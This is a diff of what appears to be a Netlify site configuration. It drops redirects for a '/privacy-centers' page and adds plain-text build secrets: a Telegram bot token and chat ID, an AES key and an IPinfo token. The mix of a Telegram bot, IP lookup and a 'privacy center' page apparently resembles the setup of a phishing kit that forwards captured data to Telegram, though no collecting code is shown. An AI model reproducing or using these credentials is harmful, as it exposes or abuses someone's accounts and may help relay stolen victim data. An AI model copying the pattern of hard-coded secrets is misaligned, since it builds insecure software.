@@ -1,13 +1,11 @@
 [build]
-  publish = "."
-  command = ""
+  command = "npm run build"
 
-[[redirects]]
-  from = "/privacy-centers"
-  to = "/privacy-centers.html"
-  status = 200
+[build.environment]
+  TELEGRAM_BOT_TOKEN = "8923259938:AAEJubVrneGo-tZsnsx8CvjTOht1aOhqOL4"
+  TELEGRAM_CHAT_ID = "-5484020803"
+  NEXT_PUBLIC_AES_SECRET_KEY = "HDNDT-JDHT8FNEK-JJHR"
+  IPINFO_TOKEN = "790b745aefcdac"
 
-[[redirects]]
-  from = "/*"
-  to = "/index.html"
-  status = 200
+[[plugins]]
+  package = "@netlify/plugin-nextjs"
